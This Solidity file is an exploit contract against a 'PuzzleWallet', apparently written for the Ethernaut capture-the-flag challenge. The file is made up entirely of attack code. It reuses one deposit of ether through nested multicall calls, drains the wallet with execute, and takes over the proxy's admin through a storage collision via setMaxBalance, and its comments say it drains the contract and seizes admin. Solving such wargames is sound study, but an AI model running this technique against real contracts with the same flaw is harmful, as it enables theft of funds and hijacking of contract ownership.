// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "puz.sol";


contract Attack {
    PuzzleWallet public wallet;


    constructor(address _add2) {
        wallet = PuzzleWallet(_add2);
    }

    function run() external{
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        //whitelisting our address
        wallet.addToWhitelist(address(this));
        //calling multicall with nested data stored above
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(address(this), 0.002 ether, "");
        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
    fallback() external payable {
        // Логіка для обробки неспецифікованих викликів
    }
    
}